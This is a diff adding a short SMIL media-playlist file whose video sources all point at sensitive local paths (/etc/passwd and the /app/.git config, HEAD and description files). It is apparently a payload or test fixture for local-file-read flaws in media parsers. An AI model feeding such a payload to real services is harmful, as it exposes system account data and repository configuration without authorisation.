@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="utf-8"?>
+<smil><body><switch>
+  <video src="/etc/passwd"/>
+  <video src="/app/.git/config"/>
+  <video src="/app/.git/HEAD"/>
+  <video src="/app/.git/description"/>
+  <video src="/app"/>
+</switch></body></smil>
